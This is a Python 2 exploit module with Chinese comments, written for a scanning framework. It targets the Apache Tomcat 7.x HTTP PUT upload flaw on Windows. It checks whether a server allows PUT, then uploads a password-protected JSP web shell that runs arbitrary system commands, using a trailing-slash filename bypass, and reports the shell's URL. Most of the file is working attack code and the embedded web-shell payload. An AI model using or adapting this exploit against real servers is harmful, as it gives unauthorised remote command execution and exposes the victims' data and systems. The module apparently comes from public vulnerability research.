#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import httplib
import time
#模块使用说明
docs = '''

#title                  :apache-tomcat PUT方法上传
#description            :

shell：http://192.168.135.132/1505876909.jsp?cmd=whoami&pwd=023
	
tomcat:apache-tomcat-7.0.70 apache-tomcat-7.0.81
在apache-tomcat-7.0.70 apache-tomcat-7.0.81测试成功。
apache-tomcat-7.0.70文件名可为test.jsp/ 和 test.jsp::$DATA
apache-tomcat-7.0.81文件名可为test.jsp/
文件名也可以试试 test.jsp/. 来绕过
PS:
本模块默认利用为其中一种，其他自行修改
漏洞有点鸡肋.....
#author                 :fuping
#date                   :20170920
#version                :1.0
#notes                  :
#python_version         :2.7.5

'''

from modules.exploit import BGExploit



class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "Tomcat PUT 上传漏洞",  # 该POC的名称
            "product": "Tomcat PUT 上传漏洞",  # 该POC所针对的应用名称,
            "product_version": "7.x",  # 应用的版本号
            "desc": '''
                当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法
                （例如，将 readonly 初始化参数由默认值设置为 false），攻击者
                将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的
                JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数
                据泄露或获取服务器权限。通过以上两个漏洞可在用户服务器上执行任意代码，
                从而导致数据泄露或获取服务器权限，存在高安全风险。
            ''',  # 该POC的描述
            "author": ["fuping"],  # 编写POC者
            "ref": [
                {self.ref.url: "http://www.freebuf.com/vuls/148283.html"},  # 引用的url
                {self.ref.bugfrom: "https://github.com/fupinglee/"},  # 漏洞出处
            ],
            "type": self.type.file_upload,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-09-19",  # 漏洞公开时间
            "create_date": "2017-10-9",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标IP",
                "Required":"no"
            },
            "port": {
                "default": "",
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":""
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义数据，用于打印获取到的信息
            "data": {
                "body": '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
                +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
            },
            #程序返回信息
            "description": "",
            "error": "",
        })


    def payload(self):
        body = self.result.data['body']
        host = self.option.target['default']
        try:
            conn = httplib.HTTPConnection(host)
            conn.request(method='OPTIONS', url='/ffffzz')
            headers = dict(conn.getresponse().getheaders())
            if 'allow' in headers and headers['allow'].find('PUT') > 0:
                conn.close()
                conn = httplib.HTTPConnection(host)
                url = "/" + str(int(time.time()))+'.jsp/'
                #url = "/" + str(int(time.time()))+'.jsp::$DATA'
                conn.request( method='PUT', url= url, body=body)
                res = conn.getresponse()
                if res.status  == 201 :
                    #print 'shell:', 'http://' + sys.argv[1] + url[:-7]
                    self.result.description = "shell: " + host + url[:-1]
                    self.result.status = True
                elif res.status == 204 :
                    self.print_info("file exists")
                else:
                    self.print_error("error")
                conn.close()
            else:
                print_warning("Server not vulnerable")
                
        except Exception,e:
            print 'Error:', e
    def exploit(self):
        """
        攻击类型
        :return:
        """
        pass


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())
